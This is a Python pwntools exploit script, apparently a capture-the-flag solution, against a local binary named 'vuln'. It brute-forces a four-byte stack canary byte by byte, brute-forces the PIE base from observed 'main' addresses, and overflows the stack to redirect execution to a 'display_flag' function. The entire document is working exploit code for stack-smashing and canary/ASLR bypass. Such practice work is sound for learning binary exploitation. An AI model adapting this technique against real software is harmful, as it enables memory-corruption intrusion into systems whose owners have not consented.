#!/bin/python3

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'


canaryOffset = 0x58 - 0x38 # from gdb
retOffset = 0x6c - 0x5c


def leakCanary():

	payload = b"A"*canaryOffset

	canary = b""

	payloadLen = canaryOffset

	for _ in range(4): # because there are 4 bytes
		payloadLen +=1
		for c in range(2**8):
			p = process('./vuln')
			p.recvuntil(b"> ")
			p.sendline(str.encode(str(payloadLen)))
			p.recvuntil(b"> ")
			p.send(payload + canary + str.encode(chr(c)))
			response = p.recv()
			p.close()
			if b"Smashing" not in response:
				canary += str.encode(chr(c))
				print(canary.decode() + "*"*(4-len(canary)))
				break
	return canary

def exploit(canary):
	e = ELF('./vuln')

	flagOut = b""
	'''
	* Try until it works (until pie is correct)
	  If you try running it over and over again,
	  you can see that the addresses of main look
	  very similar:

	0x5656f47f
	0x565c047f
	0x565c447f
	0x5658847f

	* All functions here will be 0x1000 (page) aligned,
	  so we know the address will end with '474'
	* One thing that I noticed is sometimes the addresses 
	  start with 0x566 instead of 0x565, so I modified the
	  script to bruteforce those as well.

	Thus, we only have to loop through a few
	potential values
	'''
	for i in range(0x500, 0x700):
		p = process('./vuln')

		payload = b"A"*canaryOffset
		payload += canary
		payload += b"B"*retOffset

		# Building address that we brute-force
		main_addr = '0x56'
		main_addr += hex(i)[2:].zfill(3)
		main_addr += hex(e.sym['main'] % 0x1000)[2:]
		main_addr = int(main_addr, 16)

		# offset math
		pieBaseAddress = main_addr - e.sym['main']
		payload += p32(pieBaseAddress + e.sym['display_flag'])

		p.recvuntil(b"> ")
		p.sendline(str.encode(str(len(payload))))

		p.recvuntil(b"> ")
		p.send(payload)

		p.recvuntil(b"Flag?\n")

		try:
			flagOut = p.recv()
			break
		except:
			print(f'Try {(i - 0x500 + 1):03}: Failed')

		p.close()
	return flagOut.rstrip().decode('UTF-8')


canary = leakCanary()
# canary = b'LjgH'
print(f'Found the canary: {canary}')
flag = exploit(canary)  
print(flag)


